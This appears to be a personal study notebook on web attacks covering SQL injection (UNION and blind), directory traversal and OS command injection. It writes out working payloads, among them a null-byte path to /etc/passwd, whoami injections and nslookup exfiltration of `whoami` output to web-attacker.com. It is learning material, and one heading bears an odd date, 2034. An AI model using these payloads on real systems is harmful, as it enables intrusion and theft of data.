
## web security
### learn sql 
```
order of operations

 ( FROM, WHERE, GROUP BY, HAVING,SELECT,DISTNINT,UNION, ORDER BY, LIMIT
https://community.sisense.com/t5/knowledge/sql-order-of-operations/ta-p/8989
SELECT CustomerName, ContactName, Address
FROM Customers
WHERE Address IS NOT NULL;
The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns
' UNION SELECT NULL--: Here, you are injecting a UNION statement with a SELECT statement that returns a single column with a NULL value
oracle:::::::::
' UNION SELECT NULL FROM DUAL--

. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment
```
```
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
The Information Schema COLUMNS table provides information about columns in each table on the server.

https://mariadb.com/kb/en/information-schema-columns-table
all_tables in oracle data base
we always need to specify from for queries of oracle database (we can use table 'dual')
structure of oracle all_Tables
https://docs.oracle.com/cd/B13789_01/server.101/b10755/statviews_1190.htm

ALL_TAB_COLUMNS describes the columns of the tables, views, and clusters accessible to the current user.

https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html
```
### blind
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
SUBSTRING(string_expression, start, length)

intruder in burp
https://sandunigfdo.medium.com/blind-sql-injection-with-conditional-responses-d23ff6660299
```
## 12-11-2034
### directory traversal
```
url encoding
double url encoding
....// so after one strip we get ../
if check happens whether it starts with given dir then use that dir then traverse back
if chekc happens whether file ends with given extension use null byte

a null byte to effectively terminate the file path before the required extension. For example:

filename=../../../etc/passwd%00.png
var/www/img
```
### os command injection
```
Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

->
productId=3 | whoami &storeId=1

email=x||ping+-c+10+127.0.0.1||
email=||whoami>/var/www/images/output.txt||
out of band techniques
blind os command injection with(out of band interaction,out of band data exfiltration)

& nslookup kgji2ohoyw.web-attacker.com &
This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected
(if our service provider provides us the dns server logs we can see whether nslookup happend or not
ctr+u to url encode


& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
wwwuser.kgji2ohoyw.web-attacker.com

command separtors=====/shell metacharcters
https://www.makeuseof.com/what-are-linux-metacharacters/
&
&&
|
||
just on unix(;,Newline (0x0a or \n)
Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

```
#### File Redirection Metacharacters
```
For a better understanding of redirection in Bash, each process in Linux has file descriptors, known as standard input (stdin/0), standard output (stdout/1), and standard error (stderr/2). They determine the origin of the command input and decide where to send the output and error message
```
#### brace expansion meta char
```
touch {apple,cider,vinegar}.{fruit,liquid,sour}
touch {a,b,c}.{1,2,3}={a..c}.{1..3}

```
#### other
```
pipe:Connects command output as an input to the other command.:cat /etc/passwd | grep root
semi colon:Allows execution of sequential commands, one after the other.::cd /etc ; ls -la ; chmod +x /tmp/script.php
ampresand:Runs the processes or commands in the background.::find / -perm -u=s -type f &
circumflex ^:Matches any pattern that begins with the expression followed by ^::	
cd /etc/ssh ; ls | grep ^s

```
